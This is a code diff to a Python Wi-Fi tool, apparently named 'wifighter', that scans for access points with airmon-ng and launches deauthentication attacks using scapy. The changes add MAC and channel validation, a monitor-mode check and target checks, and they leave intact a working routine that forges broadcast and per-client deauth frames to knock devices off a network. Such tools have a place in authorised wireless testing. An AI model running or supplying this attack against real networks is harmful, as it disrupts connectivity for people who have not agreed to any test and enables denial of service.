@@ -16,6 +16,7 @@ from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
 conf.verb = 0  # disable scapy verbose messages
 
 SCAN_FILE_PREFIX = "wifighter_scan"
+MAC_PATTERN = r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$'
 
 # Terminal colors
 RED = "\033[91m"
@@ -47,6 +48,11 @@ def ensure_root() -> None:
     if os.geteuid() != 0:
         print(f"{RED}[-] This tool must be run as root.{RESET}")
         sys.exit(1)
+
+
+def is_valid_mac(mac: str) -> bool:
+    """Validate MAC address format."""
+    return bool(re.match(MAC_PATTERN, mac.strip()))
 
 
 def clean_scan_files() -> None:
@@ -103,6 +109,15 @@ def get_interfaces() -> List[str]:
     return list(dict.fromkeys(interfaces))
 
 
+def is_monitor_mode(interface: str) -> bool:
+    """Check if interface is already in monitor mode."""
+    try:
+        out = subprocess.check_output(["iwconfig", interface], stderr=subprocess.DEVNULL).decode()
+        return "Mode:Monitor" in out
+    except Exception:
+        return False
+
+
 def enable_monitor_mode(interface: str) -> str:
     """
     Put the interface into monitor mode using airmon-ng.
@@ -111,6 +126,10 @@ def enable_monitor_mode(interface: str) -> str:
     Returns the monitor interface name (e.g., wlan0mon) if detected,
     otherwise returns the original interface.
     """
+    if is_monitor_mode(interface):
+        print(f"[+] {interface} is already in monitor mode.")
+        return interface
+        
     print(f"[+] Enabling monitor mode on {interface} (only running 'airmon-ng start')...")
     subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
@@ -226,19 +245,23 @@ def parse_scan_results(filename: str) -> Tuple[List[Dict[str, str]], Dict[str, L
                 # expect at least columns BSSID, CH, ESSID, Power (or PWR)
                 try:
                     bssid = row[headers_map.get("BSSID", 0)].strip()
-                    channel = row[headers_map.get("CH", 3)].strip() if "CH" in headers_map else row[3].strip()
-                    # ESSID column sometimes "ESSID" or at the end
+                    if not is_valid_mac(bssid):
+                        continue
+                    
+                    channel = ""
+                    if "CH" in headers_map:
+                        channel = row[headers_map["CH"]].strip()
+                    
                     essid = ""
                     if "ESSID" in headers_map:
                         essid = row[headers_map["ESSID"]].strip()
-                    else:
-                        # fallback: take the last column which is often used
-                        essid = row[-1].strip()
+                    
                     power = ""
                     if "PWR" in headers_map:
                         power = row[headers_map["PWR"]].strip()
                     elif "Power" in headers_map:
                         power = row[headers_map["Power"]].strip()
+                    
                     # ignore empty ESSID or BSSID lines
                     if essid == "" or bssid == "":
                         continue
@@ -251,12 +274,14 @@ def parse_scan_results(filename: str) -> Tuple[List[Dict[str, str]], Dict[str, L
                 # columns: Station MAC, First time, Last time, Power, Packets, BSSID, Probed ESSIDs
                 try:
                     client_mac = row[headers_map.get("Station MAC", 0)].strip()
-                    ap_mac = (
-                        row[headers_map.get("BSSID", -1)].strip()
-                        if "BSSID" in headers_map
-                        else (row[5].strip() if len(row) > 5 else "")
-                    )
-                    if ap_mac and ap_mac in clients:
+                    if not is_valid_mac(client_mac):
+                        continue
+                    
+                    ap_mac = ""
+                    if "BSSID" in headers_map:
+                        ap_mac = row[headers_map["BSSID"]].strip()
+                    
+                    if ap_mac and is_valid_mac(ap_mac) and ap_mac in clients:
                         clients[ap_mac].append(client_mac)
                 except Exception:
                     continue
@@ -281,8 +306,22 @@ def print_ap_list(aps: List[Dict[str, str]]) -> None:
 # Deauth attack
 
 
-def set_channel(interface: str, channel: int) -> None:
-    subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+def set_channel(interface: str, channel: str) -> bool:
+    """Set the wireless interface to a specific channel. Returns True on success."""
+    try:
+        ch_int = int(channel)
+        if ch_int < 1 or ch_int > 165:
+            print(f"[-] Invalid channel: {channel}")
+            return False
+        subprocess.run(
+            ["iwconfig", interface, "channel", str(ch_int)],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=5
+        )
+        return True
+    except (ValueError, subprocess.TimeoutExpired):
+        return False
 
 
 def deauth_attack(
@@ -297,12 +336,14 @@ def deauth_attack(
     Launch a DEAUTH attack on an AP and its clients (if provided).
     stop_event allows the attack to be interrupted from outside.
     """
+    if not is_valid_mac(ap_mac):
+        print(f"[-] Invalid AP MAC: {ap_mac}")
+        return
+    
     print(f"[+] Launching DEAUTH attack on {ap_mac} (CH {channel}) for {duration}s...")
-    try:
-        set_channel(interface, int(channel))
-    except Exception:
-        # ignore if conversion fails
-        pass
+    if not set_channel(interface, str(channel)):
+        print(f"[-] Failed to set channel {channel}")
+        return
 
     packets = []
     pkt_broadcast = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
@@ -310,6 +351,8 @@ def deauth_attack(
 
     if clients:
         for client_mac in clients:
+            if not is_valid_mac(client_mac):
+                continue
             pkt_to_client = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
             pkt_to_ap = RadioTap() / Dot11(addr1=ap_mac, addr2=client_mac, addr3=client_mac) / Dot11Deauth(reason=7)
             packets.extend([pkt_to_client, pkt_to_ap])
@@ -369,6 +412,11 @@ def interactive_main(mon_iface: str) -> None:
                 idx = int(part) - 1
                 if 0 <= idx < len(aps):
                     targets.append(aps[idx])
+
+    if not targets:
+        print("[-] No valid target selected.")
+        disable_monitor_mode(mon_iface)
+        return
 
     # optional duration
     try:
